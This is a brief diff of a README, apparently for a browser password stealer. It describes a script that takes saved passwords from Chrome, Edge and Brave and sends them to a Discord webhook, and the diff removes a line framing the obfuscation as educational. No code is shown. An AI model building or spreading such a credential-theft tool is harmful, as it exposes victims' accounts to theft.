@@ -2,7 +2,7 @@
 
 ## Description
 
-This script extracts saved passwords from Chromium-based browsers (Google Chrome, Microsoft Edge, Brave) and sends them to a specified Discord webhook. The script is obfuscated for educational purposes to demonstrate how code can be made less readable.
+This script extracts saved passwords from Chromium-based browsers (Google Chrome, Microsoft Edge, Brave) and sends them to a specified Discord webhook. 
 
 ## Disclaimer
 
